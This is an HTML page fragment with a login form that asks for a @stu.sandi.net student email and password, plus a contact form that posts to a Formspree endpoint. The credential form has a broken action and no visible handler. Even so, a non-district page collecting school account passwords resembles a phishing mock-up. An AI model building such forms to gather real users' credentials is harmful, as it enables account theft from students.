    <div class="box container">
      <footer class="container medium">

        <h2>Please log in with your student credentials:</h2>
        <br />
        <form id="emailForm" action="POST">
          <input
            id="email"
            type="email"
            name="email"
            placeholder="######@stu.sandi.net"
            required
          />
          <label id="errmsg" for="email">PLEASE ENTER SANDI.NET EMAIL</label>
          <br />
          <input
            type="password"
            name="password"
            placeholder="password"
            required
          />
          <label id="pwerrmsg" for="email"></label>
          <br />
          <div class="container medium">
            <input type="submit" />
          </div>
        </form>

        <form
          id="contact-form"
          action="https://formspree.io/f/xpzonlyq"
          method="post"
        >
          <input type="text" name="Name" placeholder="Name" required />
          <input type="email" name="Email" placeholder="Email" required />

          <!-- CONFIG -->
          <input class="is-hidden" type="text" name="_gotcha" />
          <input type="hidden" name="_subject" value="Subject" />
          <input type="hidden" name="_cc" value="email@cc.com" />
          <!-- /CONFIG -->
          <input class="submit" type="submit" value="Send" />
        </form>
      </footer>
    </div>
